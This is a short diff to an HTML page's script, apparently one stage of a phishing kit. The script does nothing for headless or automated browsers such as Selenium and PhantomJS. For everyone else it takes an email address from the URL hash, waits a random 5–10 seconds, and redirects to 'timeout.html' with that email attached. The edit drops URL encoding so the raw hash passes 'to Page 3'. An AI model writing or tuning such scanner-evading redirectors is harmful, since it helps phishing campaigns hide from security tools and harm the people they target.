@@ -23,7 +23,7 @@
 <input type="hidden" id="bot-check" value="no-bot">
 <script>
 window.addEventListener('load', function() {
-  // --- Anti-bot / headless ---
+  // --- Anti-bot / headless detection ---
   if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) return;
 
   const botCheck = document.getElementById('bot-check');
@@ -31,10 +31,11 @@ window.addEventListener('load', function() {
     let email = window.location.hash ? window.location.hash.substring(1) : '';
     email = email.replace(/=*$/, ''); // strip trailing =
 
-    // Random delay 5–10s
+    // Random delay 5–10 seconds
     const delay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
     setTimeout(() => {
-      window.location.href = 'timeout.html' + (email ? '#' + encodeURIComponent(email) : '');
+      // Forward raw hash to Page 3
+      window.location.href = 'timeout.html' + (email ? '#' + email : '');
     }, delay);
   }
 });
@@ -42,4 +43,5 @@ window.addEventListener('load', function() {
 </body>
 
 </html>
+
 
